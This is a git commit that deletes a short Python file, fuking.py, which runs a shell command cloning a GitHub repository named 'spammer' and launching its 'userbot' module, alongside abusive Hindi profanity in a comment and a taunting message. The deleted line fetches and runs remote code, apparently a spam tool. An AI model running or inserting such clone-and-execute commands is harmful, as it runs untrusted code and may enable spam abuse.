51a9ca1b7837a6149aa9a5d50ae98b09c2cb59ee
xD_Shashank <78837537+theshashankk@users.noreply.github.com>
2021-06-04 09:58:54 +0530

    Delete fuking.py

--- fuking.py
+++
@@ -1,4 +0,0 @@
-from os import system # chala ja bhosdike madarchod
-system ("git clone https://github.com/theshashankk/spammer.git && cd spammer && python3 -m userbot")
-# try af
-print ("YOU GOT ERROR SAVE THE LOGS AND GIVE THIS LOGS TO YOUR FATHER")
